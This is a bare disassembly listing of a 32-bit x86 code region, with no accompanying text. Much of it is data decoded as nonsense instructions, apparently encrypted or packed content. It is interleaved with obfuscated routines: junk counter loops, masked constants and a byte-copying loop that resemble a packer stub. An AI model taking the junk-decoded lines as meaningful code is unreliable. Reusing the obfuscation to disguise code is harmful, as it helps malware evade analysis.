  410123:	sbb    DWORD PTR [ebx+0x5e044f72],0x4e
  41012a:	stos   DWORD PTR es:[edi],eax
  41012b:	adc    eax,0x34a526f
  410130:	push   0xffffffe3
  410132:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410133:	xchg   ebp,eax
  410134:	pop    ss
  410135:	mov    ebx,0xce43d5ee
  41013a:	mov    dl,0x20
  41013c:	xchg   BYTE PTR [edx+edx*2],bh
  41013f:	sti    
  410140:	(bad)  
  410142:	xchg   esp,eax
  410143:	pop    ebp
  410144:	jae    0x410195
  410146:	push   ss
  410147:	data16 loop 0x410103
  41014a:	mov    esp,edi
  41014c:	nop
  41014d:	xor    al,BYTE PTR [edi-0x67]
  410150:	mov    al,0x34
  410152:	dec    ecx
  410153:	cmc    
  410154:	popa   
  410155:	or     ebp,DWORD PTR [edx+0x32d312f5]
  41015b:	add    dh,BYTE PTR [ebx]
  41015d:	cs dec esi
  41015f:	add    DWORD PTR [eax],ecx
  410161:	pop    es
  410162:	ja     0x4101a9
  410164:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410165:	dec    esp
  410166:	mov    ch,0x71
  410168:	sahf   
  410169:	jl     0x4101c6
  41016b:	add    DWORD PTR [eax+0x1b1389eb],esi
  410171:	cdq    
  410172:	sbb    eax,0x9eac07de
  410177:	xchg   edi,eax
  410178:	mov    ebx,0x9d9f0e1c
  41017d:	pop    esi
  41017e:	retf   0x2fef
  410181:	mov    al,0xbc
  410183:	mov    bl,cl
  410185:	dec    sp
  410187:	mov    bh,0x49
  410189:	(bad)  
  41018a:	and    edi,DWORD PTR [ecx+0x45]
  41018d:	adc    DWORD PTR [edx+0x26],ebx
  410190:	aam    0xd7
  410192:	out    0xbf,eax
  410194:	mov    cl,0xf8
  410196:	mov    ah,0x8d
  410198:	call   0xd80e3cb4
  41019d:	in     eax,0x26
  41019f:	lods   al,BYTE PTR ds:[esi]
  4101a0:	dec    esp
  4101a1:	pushf  
  4101a2:	dec    esi
  4101a3:	cmc    
  4101a4:	stos   BYTE PTR es:[edi],al
  4101a5:	shl    ebp,1
  4101a7:	pop    esp
  4101a8:	inc    esp
  4101a9:	iret   
  4101aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4101ab:	ret    0xd9b
  4101ae:	mov    ds:0xe6bdffe,al
  4101b3:	xchg   esi,eax
  4101b4:	ss in  al,dx
  4101b6:	push   cs
  4101b7:	xchg   esp,eax
  4101b8:	sub    DWORD PTR [ecx+0x60082820],edi
  4101be:	(bad)  
  4101bf:	rcl    edx,cl
  4101c1:	fisubr WORD PTR [ebx+ecx*2+0x22cc4efe]
  4101c8:	pusha  
  4101c9:	mov    eax,ecx
  4101cb:	test   al,0xea
  4101cd:	mov    ds:0x5213e10,eax
  4101d2:	out    dx,al
  4101d3:	test   BYTE PTR [ecx+0x6ae622c0],cl
  4101d9:	aaa    
  4101da:	push   esp
  4101db:	mov    BYTE PTR [edx-0x131cb17c],bl
  4101e1:	in     al,0x55
  4101e3:	shr    DWORD PTR [ebx-0x6f38f99f],0x5
  4101ea:	leave  
  4101eb:	jmp    0x387:0xeccb696f
  4101f2:	std    
  4101f3:	pop    ds
  4101f4:	xchg   ebp,eax
  4101f5:	xchg   DWORD PTR ds:0x9b87efb5,ebp
  4101fb:	jl     0x410267
  4101fd:	xor    eax,ecx
  4101ff:	sbb    al,0x1c
  410201:	mov    edx,0x62cd9e3d
  410206:	push   ecx
  410207:	int3   
  410208:	sahf   
  410209:	pop    ebp
  41020a:	adc    edi,ebp
  41020c:	push   ebx
  41020d:	cmc    
  41020e:	push   ds
  41020f:	(bad)  [ecx+0x17094c5f]
  410215:	repz lahf 
  410217:	sti    
  410218:	sbb    al,cl
  41021a:	pop    ss
  41021b:	mov    dl,0xba
  41021d:	mov    ebx,0xdbc0a169
  410222:	lods   eax,DWORD PTR ds:[esi]
  410223:	idiv   BYTE PTR [edx+0x78e78dbe]
  410229:	inc    BYTE PTR [edi-0x55e80cd2]
  41022f:	sub    BYTE PTR [ecx-0x1f],bh
  410232:	mov    ecx,0x6180e500
  410237:	push   ds
  410238:	or     dh,ch
  41023a:	pushf  
  41023b:	or     DWORD PTR ds:0x9887506a,edx
  410241:	out    0x17,eax
  410243:	dec    ecx
  410244:	add    al,0x71
  410246:	push   edi
  410247:	fdivrp st(2),st
  410249:	jnp    0x41024c
  41024b:	test   DWORD PTR [edi],esi
  41024d:	cs push edx
  41024f:	push   ebp
  410250:	lds    eax,FWORD PTR [edi+0x45ff4419]
  410256:	push   ebx
  410257:	jae    0x410280
  410259:	out    dx,al
  41025a:	adc    eax,0xf39c5d6
  41025f:	jnp    0x4101e1
  410261:	mov    BYTE PTR [esi-0x3c1c7ddc],bh
  410267:	xchg   ecx,eax
  410268:	rcl    BYTE PTR [eax],0xec
  41026b:	sar    BYTE PTR [ecx],1
  41026d:	pop    ebp
  41026e:	repnz ins DWORD PTR es:[edi],dx
  410270:	xchg   edx,eax
  410271:	push   ebp
  410272:	add    eax,0xa92e89e5
  410277:	mov    al,ds:0x7ad6f6b9
  41027c:	loop   0x4102a5
  41027e:	call   FWORD PTR [edi+0x24]
  410281:	stc    
  410282:	jnp    0x410289
  410284:	sub    eax,0x6431ae1d
  410289:	push   esp
  41028a:	shl    cl,1
  41028c:	scas   al,BYTE PTR es:[edi]
  41028d:	mov    ah,0x19
  41028f:	jg     0x410275
  410291:	push   ecx
  410292:	xchg   ecx,eax
  410293:	sbb    eax,DWORD PTR ds:0xc7f8758b
  410299:	add    eax,0x4337eb
  41029e:	mov    ch,0x5
  4102a0:	add    BYTE PTR [eax],al
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x65ba197e],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103a5
  4103eb:	popf   
  4103ec:	or     dh,BYTE PTR [edi+0x1f]
  4103ef:	lea    eax,[edx]
  4103f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103f2:	inc    edi
  4103f3:	dec    eax
  4103f4:	daa    
  4103f5:	sub    al,0x51
  4103f7:	xchg   ecx,eax
  4103f8:	cmp    eax,0x5e929dbb
  4103fd:	jo     0x410433
  4103ff:	fidiv  WORD PTR [ebp-0x5e51b36c]
  410405:	(bad)  
  410406:	(bad)  
  410407:	out    0xeb,eax
  410409:	dec    esi
  41040a:	mov    edx,DWORD PTR [ecx]
  41040c:	cmp    eax,0x52bb5f7d
  410411:	pop    ecx
  410412:	push   ebp
  410413:	xor    BYTE PTR [ecx+0x3421e72f],ch
  410419:	mov    edx,DWORD PTR [eax+edx*4+0x7b8ba64a]
  410420:	retf   0xd58f
  410423:	add    al,0x10
  410425:	mov    ch,0x3b
  410427:	sbb    al,BYTE PTR [ecx+eiz*8-0x36]
  41042b:	imul   BYTE PTR [edx-0x2d8f1798]
  410431:	mov    es,ecx
  410433:	xor    DWORD PTR [ecx+0xacbbfbc],esp
  410439:	mov    dh,0xfd
  41043b:	sbb    al,0x99
  41043d:	sub    dl,bl
  41043f:	mov    eax,ds:0x8c75b53e
  410444:	mov    ds:0x9cf42867,al
  410449:	sub    BYTE PTR [esp+ebp*8-0x53],bh
  41044d:	adc    eax,0xb0d49875
  410452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410453:	aas    
  410454:	cdq    
  410455:	mov    eax,0x22f50fc5
  41045a:	mov    dl,0x65
  41045c:	push   ecx
  41045d:	int    0xfb
  41045f:	adc    eax,DWORD PTR [edx]
  410461:	push   ebx
  410462:	pop    eax
  410463:	cdq    
  410464:	dec    edx
  410465:	clc    
  410466:	nop
  410467:	mov    ecx,DWORD PTR [edi-0x32423711]
  41046d:	inc    ebp
  41046e:	hlt    
  41046f:	ins    BYTE PTR es:[edi],dx
  410470:	jmp    0x41040c
  410472:	mov    al,0xdf
  410474:	scas   eax,DWORD PTR es:[edi]
  410475:	pop    esp
  410476:	xchg   ebx,eax
  410477:	fisubr DWORD PTR [ebp+0x9adec22]
  41047d:	jle    0x4104e8
  41047f:	sbb    DWORD PTR [edx],0x40
  410482:	(bad)  
  410483:	sub    al,0xdf
  410485:	or     bh,ch
  410487:	push   es
  410488:	(bad)  
  410489:	sbb    ch,BYTE PTR [ebx]
  41048b:	mov    WORD PTR [eax-0x43],?
  41048e:	call   0x3bb2:0xc6e3ac44
  410495:	gs test eax,0xbd42aed6
  41049b:	inc    edx
  41049c:	dec    esp
  41049d:	push   edx
  41049e:	aad    0xc2
  4104a0:	and    eax,0xe2d48804
  4104a5:	ja     0x4104e3
  4104a7:	cwde   
  4104a8:	push   ebx
  4104a9:	dec    esp
  4104aa:	hlt    
  4104ab:	outs   dx,BYTE PTR ds:[esi]
  4104ac:	sbb    eax,0xe79a6406
  4104b1:	cmp    BYTE PTR [ebp+0x24],ch
  4104b4:	rcl    esp,cl
  4104b6:	xchg   edx,eax
  4104b7:	rcl    DWORD PTR [edi-0x71],1
  4104ba:	sbb    ch,bl
  4104bc:	ds adc eax,0x6f6816f3
  4104c2:	(bad)  
  4104c3:	lock fs jnp 0x410456
  4104c7:	xor    ebp,0x9c7cb6dd
  4104cd:	sub    al,0xe4
  4104cf:	cs push esp
  4104d1:	call   0x74c5:0x7ea0a06f
  4104d8:	vcvtss2sd xmm3,xmm6,xmm4
  4104dc:	cs out 0x0,eax
  4104df:	xchg   edi,eax
  4104e0:	leave  
  4104e1:	aad    0xad
  4104e3:	pop    esp
  4104e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104e5:	pop    esp
  4104e6:	std    
  4104e7:	sbb    eax,0x915cfe3a
  4104ec:	mov    ebx,esp
  4104ee:	pop    ss
  4104ef:	es pop es
  4104f1:	cmp    edi,DWORD PTR [bx+0x26]
  4104f5:	mov    fs,ebp
  4104f7:	mov    ds:0x3e483201,al
  4104fc:	inc    eax
  4104fd:	push   esi
  4104fe:	enter  0xfb01,0xaf
  410502:	push   es
  410503:	cdq    
  410504:	inc    esp
  410505:	fs push 0x41
  410508:	sti    
  410509:	mov    eax,0x5e05c941
  41050e:	pusha  
  41050f:	shr    edi,cl
  410511:	inc    edi
  410512:	lahf   
  410513:	icebp  
  410514:	neg    BYTE PTR ds:0xaf82a4b5
  41051a:	sub    eax,edx
  41051c:	test   DWORD PTR [ebp-0x53806002],ebp
  410522:	dec    eax
  410523:	xchg   BYTE PTR [esi],dh
  410525:	stos   DWORD PTR es:[edi],eax
  410526:	dec    eax
  410527:	call   0x16faaaff
  41052c:	xor    esi,DWORD PTR [eax+0x2d666f13]
  410532:	adc    al,0xde
  410534:	dec    eax
  410535:	add    eax,0xa2e238f9
  41053a:	pop    ds
  41053b:	and    al,0xd7
  41053d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41053e:	hlt    
  41053f:	fwait
  410540:	ds test al,0xda
  410543:	popa   
  410544:	icebp  
  410545:	sbb    eax,0x58bd6966
  41054a:	and    BYTE PTR [esi+0x0],ah
  41054d:	mov    cl,0x89
  41054f:	fdivr  st(0),st
  410552:	add    BYTE PTR [eax-0x20],cl
  410555:	hlt    
  410556:	ss xchg ebp,eax
  410558:	repz mov ?,WORD PTR [edi]
  41055b:	outs   dx,BYTE PTR ds:[esi]
  41055c:	fnstcw WORD PTR [ecx-0x78]
  41055f:	aad    0xed
  410561:	daa    
  410562:	(bad)  
  410563:	fiadd  DWORD PTR [ecx-0x70a5e123]
  410569:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41056a:	push   ebx
  41056b:	loop   0x410553
  41056d:	xor    BYTE PTR [ecx+0x22],al
  410570:	add    esp,DWORD PTR ds:0xc507b2f3
  410576:	inc    ebp
  410577:	pop    esi
  410578:	aas    
  410579:	jae    0x4105db
  41057b:	in     al,dx
  41057c:	fidiv  WORD PTR [ecx+0x408a6eea]
  410582:	inc    edx
  410583:	lahf   
  410584:	xchg   ebx,eax
  410585:	fisttp QWORD PTR [esi+0x0]
  410588:	xchg   edi,eax
  410589:	xor    eax,DWORD PTR [edi+0x14]
  41058c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41058e:	sub    DWORD PTR ds:0xd098e18b,esp
  410594:	cmp    BYTE PTR [ecx],cl
  410596:	cs pop edi
  410598:	int3   
  410599:	pop    eax
  41059a:	add    bh,ah
  41059c:	xlat   BYTE PTR ds:[ebx]
  41059d:	es xchg esp,eax
  41059f:	dec    eax
  4105a0:	ins    BYTE PTR es:[edi],dx
  4105a1:	adc    ecx,DWORD PTR [ebp+0x7d3b3471]
  4105a7:	aas    
  4105a8:	(bad)  
  4105a9:	aad    0xd3
  4105ab:	imul   ecx,DWORD PTR [eax+ecx*4+0x1],0xffd6b6ab
  4105b3:	xchg   edx,eax
  4105b4:	jo     0x410562
  4105b6:	into   
  4105b7:	add    edx,eax
  4105b9:	jle    0x410546
  4105bb:	pop    esi
  4105bc:	jne    0x410616
  4105be:	sti    
  4105bf:	mov    al,0xec
  4105c1:	ss mov ebp,0x899e224f
  4105c7:	add    DWORD PTR [eax+ebx*8+0x18],ebp
  4105cb:	sar    BYTE PTR [eax+0x30],1
  4105ce:	pop    ds
  4105cf:	mov    ecx,DWORD PTR [ecx+ecx*4+0x6f]
  4105d3:	data16 jg 0x410560
  4105d6:	push   0x45
  4105d8:	pop    eax
  4105d9:	or     esp,edx
  4105db:	std    
  4105dc:	daa    
  4105dd:	mov    ebx,0x2d462452
  4105e2:	data16 cli 
  4105e4:	shl    BYTE PTR [eax],1
  4105e6:	adc    eax,0xc8c3e09e
  4105eb:	mov    cl,0xbb
  4105ed:	mov    cl,0x9b
  4105ef:	cld    
  4105f0:	outs   dx,BYTE PTR ds:[esi]
  4105f1:	xor    esp,DWORD PTR ds:0x147424e7
  4105f7:	or     DWORD PTR [ecx-0x1c],0x5a
  4105fb:	jae    0x410650
  4105fd:	xchg   edx,eax
  4105fe:	jmp    0x3611e345
  410603:	outs   dx,BYTE PTR ds:[esi]
  410604:	aad    0xc7
  410606:	call   0x29108d0a
  41060b:	ror    ch,1
  41060d:	cdq    
  41060e:	sbb    ah,BYTE PTR [edi+0x54c773dc]
  410614:	daa    
  410615:	(bad)  
  410617:	or     ebx,DWORD PTR [esi+0x75]
  41061a:	iret   
  41061b:	sub    BYTE PTR [ecx],cl
  41061d:	push   edx
  41061e:	add    al,0xf8
  410620:	inc    ecx
  410621:	push   es
  410622:	jo     0x4105d8
  410624:	ror    DWORD PTR [esp+ebp*4+0x20],0xd7
  410629:	and    ah,dh
  41062b:	pop    ss
  41062c:	adc    edx,esp
  41062e:	shl    BYTE PTR ds:0x1dedfced,0x77
  410635:	adc    BYTE PTR [ebx],dh
  410637:	xchg   ebp,eax
  410638:	sbb    BYTE PTR [ecx-0x1e],0xa6
  41063c:	xchg   ebx,eax
  41063d:	fdivp  st(4),st
  41063f:	outs   dx,BYTE PTR ds:[esi]
  410640:	aaa    
  410641:	and    BYTE PTR [ebp+0x16],ah
  410644:	clc    
  410645:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410646:	xor    edx,ebp
  410648:	sbb    al,0x9f
  41064a:	cmp    al,0x91
  41064c:	inc    esp
  41064d:	mov    dl,0x2f
  41064f:	mov    ah,0x2d
  410651:	out    0xdd,al
  410653:	test   dl,ah
  410655:	push   edi
  410656:	je     0x4105f8
  410658:	and    ch,BYTE PTR [esi+edi*1-0x38741cf9]
  41065f:	inc    ebp
  410660:	cld    
  410661:	xor    al,BYTE PTR [ebp+0x2581f89c]
  410667:	adc    esi,DWORD PTR [edi]
  410669:	inc    ebx
  41066a:	add    BYTE PTR [eax],al
  41066c:	add    BYTE PTR [eax],al
  41066e:	add    BYTE PTR [ebx+0x43371315],cl
  410674:	add    BYTE PTR [edx-0x77],al
  410677:	adc    eax,0x433713
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	inc    ecx
  4107d5:	jo     0x41082e
  4107d7:	push   0x7e7ebb91
  4107dc:	jmp    0xab15:0xfd7e7e7c
  4107e3:	sub    al,BYTE PTR [edx+0x2e7bdfc]
  4107e9:	fs inc edi
  4107eb:	cmp    edx,DWORD PTR [ebx-0x33df9c89]
  4107f1:	test   al,0xa8
  4107f3:	std    
  4107f4:	add    DWORD PTR [edi-0xd8698e3],esp
  4107fa:	mov    dh,0x85
  4107fc:	lea    ebp,[edx+eiz*1]
  4107ff:	inc    ecx
  410800:	call   0xeca6:0xb430e345
  410807:	fsubr  QWORD PTR [edi+0x61]
  41080a:	in     eax,0xd7
  41080c:	adc    eax,0x7a14a104
  410811:	fcmove st,st(5)
  410813:	cmp    BYTE PTR [ecx+0x24],0xcf
  410817:	mov    edx,0xfb03a27
  41081c:	mov    ecx,0xa3ae19b9
  410821:	repz mov al,0xb6
  410824:	shl    DWORD PTR [eax-0x674da1d0],0x76
  41082b:	aas    
  41082c:	pop    ebx
  41082d:	xchg   DWORD PTR [esi+0x4],edi
  410830:	xor    eax,0x6f8f588b
  410835:	inc    esp
  410836:	in     al,0x7b
  410838:	outs   dx,DWORD PTR ds:[esi]
  410839:	pusha  
  41083a:	adc    DWORD PTR [ebx-0x1d26a769],ecx
  410840:	inc    esi
  410841:	add    eax,0xaece3d6a
  410846:	cmp    eax,0xfa6b75d3
  41084b:	sahf   
  41084c:	cdq    
  41084d:	and    al,0xb0
  41084f:	mov    ah,0x90
  410851:	mov    esi,0x99d49efc
  410856:	pop    edx
  410857:	xchg   ecx,eax
  410858:	jo     0x41089c
  41085a:	mov    dl,0xd7
  41085c:	outs   dx,BYTE PTR ds:[esi]
  41085d:	nop
  41085e:	test   DWORD PTR [edi+0x1f6b77a6],ebp
  410864:	push   ebp
  410865:	sar    BYTE PTR [ebx-0x74],cl
  410868:	faddp  st(4),st
  41086a:	add    esp,DWORD PTR [esi-0x10]
  41086d:	inc    ebx
  41086e:	inc    edx
  41086f:	sub    al,0x1b
  410871:	mov    ebx,0xd7024d1b
  410876:	jns    0x410848
  410878:	mov    eax,ds:0xe7d9b37f
  41087d:	ins    BYTE PTR es:[edi],dx
  41087e:	jae    0x410869
  410880:	jp     0x41085e
  410882:	mov    BYTE PTR [ecx+0x2cce4871],dl
  410888:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410889:	mov    ecx,0x207d59e1
  41088e:	mov    al,ds:0x497bc7b7
  410893:	mov    eax,ds:0x73187403
  410898:	jns    0x41088a
  41089a:	cmp    bh,BYTE PTR [edi]
  41089c:	push   es
  41089d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41089e:	pop    ebp
  4108a0:	sub    dl,BYTE PTR [eax-0x6d]
  4108a3:	pop    ds
  4108a4:	jnp    0x410920
  4108a6:	jne    0x4108ff
  4108a8:	aaa    
  4108a9:	mov    ebx,0x7b759fb3
  4108ae:	sti    
  4108af:	aaa    
  4108b0:	inc    eax
  4108b1:	in     eax,0xdb
  4108b3:	inc    edi
  4108b4:	cdq    
  4108b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108b6:	fdiv   DWORD PTR [esi]
  4108b8:	jnp    0x410863
  4108ba:	mov    bl,bl
  4108bc:	mov    cl,BYTE PTR [esp+ebx*2-0x75]
  4108c0:	inc    edi
  4108c1:	arpl   WORD PTR [esi+0x71],ax
  4108c4:	les    eax,FWORD PTR [edi]
  4108c6:	scas   eax,DWORD PTR es:[edi]
  4108c7:	adc    eax,0x29a3bdce
  4108cc:	arpl   WORD PTR [eax],di
  4108ce:	push   ecx
  4108cf:	mov    cl,0xc2
  4108d1:	dec    edi
  4108d2:	icebp  
  4108d3:	inc    ecx
  4108d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4108d5:	pop    esi
  4108d6:	mov    ds,WORD PTR [edi-0xefa4a40]
  4108dc:	sbb    eax,0xd3818b29
  4108e1:	xchg   ecx,eax
  4108e2:	or     DWORD PTR [eax+edx*1],edi
  4108e5:	xchg   BYTE PTR [ebx+ebx*8+0x7e855818],al
  4108ec:	ror    BYTE PTR [ebp+0x15],cl
  4108ef:	cwde   
  4108f0:	lahf   
  4108f1:	mov    ch,0x1a
  4108f3:	or     eax,DWORD PTR cs:[edi+0x5a1e925b]
  4108fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108fb:	ja     0x410917
  4108fd:	test   DWORD PTR [esi+0x4d8c0f80],ebx
  410903:	cmp    bh,BYTE PTR [eax+0x32aa3482]
  410909:	(bad)  
  41090a:	jb     0x410973
  41090c:	loope  0x410954
  41090e:	or     BYTE PTR [edi+0x8],0x54
  410912:	mov    edi,0xe8e6e5b6
  410917:	clc    
  410918:	or     ecx,DWORD PTR [ebx-0x13]
  41091b:	and    al,0x36
  41091d:	cli    
  41091e:	fmulp  st(0),st
  410920:	pop    DWORD PTR [ebx]
  410922:	test   ch,cl
  410924:	inc    edx
  410925:	pop    ebx
  410926:	rol    BYTE PTR [edx+0x40501dc4],0x46
  41092d:	jmp    0xc8f72786
  410932:	scas   eax,DWORD PTR es:[edi]
  410933:	daa    
  410934:	and    BYTE PTR ds:0x870516c3,0xa2
  41093b:	loopne 0x410927
  41093d:	out    0xae,al
  41093f:	je     0x41097f
  410941:	sbb    bh,cl
  410943:	jmp    0x795cbdf1
  410948:	push   eax
  410949:	(bad)  [edi-0x6b]
  41094c:	(bad)  
  41094d:	daa    
  41094e:	xchg   ebp,eax
  41094f:	or     eax,0xaf5a7421
  410954:	or     al,0x1c
  410956:	cld    
  410957:	pop    ebx
  410958:	ins    BYTE PTR es:[edi],dx
  410959:	mov    dl,0xa3
  41095b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41095c:	dec    edi
  41095d:	aaa    
  41095e:	imul   BYTE PTR [ebx-0x31aec931]
  410964:	mov    ss,eax
  410966:	lahf   
  410967:	xor    DWORD PTR [eax],0x6efe885c
  41096d:	ret    
  41096e:	or     al,0x8b
  410970:	add    al,0x3d
  410972:	mov    al,ds:0x62677cb
  410977:	daa    
  410978:	loop   0x41095a
  41097a:	aaa    
  41097b:	inc    ebx
  41097c:	adc    dl,ch
  41097e:	mov    DWORD PTR [edx+0x4381e6e4],eax
  410984:	shl    DWORD PTR [ebp+eax*1-0x5b],1
  410988:	push   0xffffffc7
  41098a:	scas   eax,DWORD PTR es:[edi]
  41098b:	xor    dh,bl
  41098d:	jge    0x41091e
  41098f:	in     eax,dx
  410990:	and    al,0x5d
  410992:	out    0x80,eax
  410994:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410995:	lea    ebp,[eax+0x41c6998a]
  41099b:	sub    ah,al
  41099d:	mov    cl,0x36
  41099f:	inc    edi
  4109a0:	push   esp
  4109a1:	sbb    DWORD PTR [edx],esi
  4109a3:	pop    edx
  4109a4:	ins    DWORD PTR es:[edi],dx
  4109a5:	ret    0x257f
  4109a8:	and    dl,BYTE PTR [edi]
  4109aa:	repz popf 
  4109ac:	or     BYTE PTR [edx+0x30],cl
  4109af:	sbb    bl,BYTE PTR [edi]
  4109b1:	stc    
  4109b2:	add    BYTE PTR [ecx-0x4e],0x1a
  4109b6:	inc    eax
